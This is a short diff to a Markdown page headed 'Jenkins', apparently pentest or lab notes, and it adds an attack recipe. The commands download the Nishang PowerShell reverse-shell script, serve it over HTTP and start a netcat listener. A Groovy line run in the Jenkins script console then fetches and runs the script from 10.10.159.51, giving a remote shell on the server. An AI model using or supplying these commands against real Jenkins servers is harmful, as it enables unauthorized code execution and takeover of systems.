@@ -1,6 +1,16 @@
 # Jenkins
 
+```
+$ mkdir webup && cd webup
+$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+py
+$ python -m http.server 8888
 
+$ nc -nlvp 443
+
+Navigate to http://IP:8080/script
+println "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.159.51:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.159.51 -Port 443".execute().text
+```
 
 ````
 **Authors**: < [nixawk](https://github.com/nixawk) >
